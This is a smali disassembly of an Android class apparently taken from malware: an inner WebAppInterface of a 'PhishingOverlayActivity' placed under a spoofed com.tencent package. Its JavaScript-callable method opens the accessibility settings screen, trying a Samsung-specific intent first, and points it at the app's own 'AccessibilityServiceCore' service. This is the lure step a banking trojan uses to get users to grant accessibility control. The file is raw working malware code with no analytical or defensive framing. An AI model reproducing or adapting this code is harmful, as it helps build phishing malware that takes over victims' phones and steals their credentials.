.class public Lcom/tencent/PhishingOverlayActivity$WebAppInterface;
.super Ljava/lang/Object;
.source "withdrawalhskfdisagreed3.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/tencent/PhishingOverlayActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "WebAppInterface"
.end annotation


# instance fields
.field mContext:Landroid/content/Context;

.field final synthetic this$0:Lcom/tencent/PhishingOverlayActivity;


# direct methods
.method constructor <init>(Lcom/tencent/PhishingOverlayActivity;Landroid/content/Context;)V
    .locals 0

    .line 248
    iput-object p1, p0, Lcom/tencent/PhishingOverlayActivity$WebAppInterface;->this$0:Lcom/tencent/PhishingOverlayActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 249
    iput-object p2, p0, Lcom/tencent/PhishingOverlayActivity$WebAppInterface;->mContext:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public returnResult()V
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, ":settings:fragment_args_key"

    const-string v1, "android.settings.ACCESSIBILITY_SETTINGS"

    .line 259
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "com.samsung.accessibility.installed_service"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v3, 0x70000000

    .line 260
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 262
    iget-object v4, p0, Lcom/tencent/PhishingOverlayActivity$WebAppInterface;->this$0:Lcom/tencent/PhishingOverlayActivity;

    invoke-virtual {v4}, Lcom/tencent/PhishingOverlayActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v4

    if-nez v4, :cond_0

    .line 263
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 265
    iget-object v4, p0, Lcom/tencent/PhishingOverlayActivity$WebAppInterface;->this$0:Lcom/tencent/PhishingOverlayActivity;

    invoke-virtual {v4}, Lcom/tencent/PhishingOverlayActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v4

    if-nez v4, :cond_0

    .line 266
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.extra.COMPONENT_NAME"

    .line 267
    new-instance v2, Landroid/content/ComponentName;

    sget-object v4, Lcom/tencent/PhishingOverlayActivity;->myctx:Landroid/content/Context;

    const-class v5, Lcom/tencent/AccessibilityServiceCore;

    invoke-direct {v2, v4, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 268
    invoke-virtual {v0, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 269
    iget-object v1, p0, Lcom/tencent/PhishingOverlayActivity$WebAppInterface;->this$0:Lcom/tencent/PhishingOverlayActivity;

    invoke-virtual {v1, v0}, Lcom/tencent/PhishingOverlayActivity;->startActivity(Landroid/content/Intent;)V

    return-void

    .line 273
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 274
    iget-object v3, p0, Lcom/tencent/PhishingOverlayActivity$WebAppInterface;->this$0:Lcom/tencent/PhishingOverlayActivity;

    invoke-virtual {v3}, Lcom/tencent/PhishingOverlayActivity;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "/"

    .line 275
    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 276
    const-class v3, Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v3}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 277
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 278
    new-instance v3, Landroid/os/Bundle;

    invoke-direct {v3}, Landroid/os/Bundle;-><init>()V

    .line 279
    invoke-virtual {v3, v0, v1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 280
    invoke-virtual {v2, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, ":settings:show_fragment_args"

    .line 281
    invoke-virtual {v2, v0, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Bundle;)Landroid/content/Intent;

    .line 282
    iget-object v0, p0, Lcom/tencent/PhishingOverlayActivity$WebAppInterface;->this$0:Lcom/tencent/PhishingOverlayActivity;

    invoke-virtual {v0, v2}, Lcom/tencent/PhishingOverlayActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
